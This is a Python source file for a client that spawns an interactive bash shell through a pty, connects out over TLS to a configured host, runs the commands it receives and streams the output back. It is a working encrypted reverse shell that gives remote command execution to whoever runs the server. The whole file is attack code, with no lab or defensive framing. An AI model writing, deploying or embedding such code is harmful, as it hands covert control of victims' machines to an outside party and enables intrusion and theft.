import ssl
import base64
import socket
import threading
import subprocess
from datetime import datetime
from queue import Queue, Empty

from network.NetworkError import NetworkError
from network.vp_protocol.vp_send import vp_send
from network.vp_protocol.vp_recv import vp_recv
from network.vp_protocol.authentication.client import client as vp_client_auth


class Client:
    def __init__(self, host, port, public_key, private_key, certificate):
        self.host = host
        self.port = port
        self.public_key = public_key
        self.private_key = private_key
        self.certificate = certificate
        self.output_queue = Queue()
        self.sending_queue = Queue()

    def run(self):
        process = subprocess.Popen(args=['python', '-c',
                                         'import pty; pty.spawn("/bin/bash")'],
                                   stdin=subprocess.PIPE,
                                   stdout=subprocess.PIPE,
                                   stderr=subprocess.STDOUT,
                                   shell=False,
                                   bufsize=-1)
        try:
            context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
            context.load_verify_locations(cafile=self.certificate)
        except OSError as e:
            raise NetworkError(message=f"[!] SSL context creation error {e}")
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as conn:
            with context.wrap_socket(conn, server_side=False,
                                     server_hostname=self.host) as ssock:
                try:
                    ssock.connect((self.host, self.port))
                except (ConnectionRefusedError, ssl.SSLError,
                        ssl.SSLCertVerificationError, socket.gaierror) as e:
                    raise NetworkError(message=f"{e}")
                print(f"[ ] SSL protocol version: {ssock.version()}")
                vp_client_auth(conn=ssock,
                               public_key=self.public_key,
                               private_key=self.private_key)
                threading.Thread(target=self.read_thread,
                                 args=(process,),
                                 daemon=True).start()
                threading.Thread(target=self.sending_thread,
                                 args=(process, ssock,),
                                 daemon=True).start()
                threading.Thread(target=self.output_thread,
                                 args=(ssock,),
                                 daemon=True).start()
                while True:
                    message = vp_recv(conn=ssock,
                                      private_key=self.private_key,
                                      public_key=self.public_key)
                    if not message:
                        break
                    else:
                        process.stdin.write(message.encode() + b'\n')
                        process.stdin.flush()

    def read_thread(self, process):
        for line in process.stdout:
            self.output_queue.put(line.decode().strip())

    def sending_thread(self, process, conn):
        while True:
            output = self.sending_queue.get()
            vp_send(conn=conn,
                    message=output,
                    private_key=self.private_key,
                    public_key=self.public_key)

    def output_thread(self, conn):
        buffer = ''
        while True:
            output = self.output_queue.get()
            buffer += f"{output}\n"
            if self.output_queue.empty():
                while buffer:
                    if len(buffer) > 4096:
                        self.sending_queue.put(buffer[:4096])
                        buffer = buffer[4096:]
                    else:
                        try:
                            self.sending_queue.put(buffer)
                        except NetworkError as e:
                            print(f"[!] Connection error {e}")
                            quit()
                        else:
                            buffer = ''
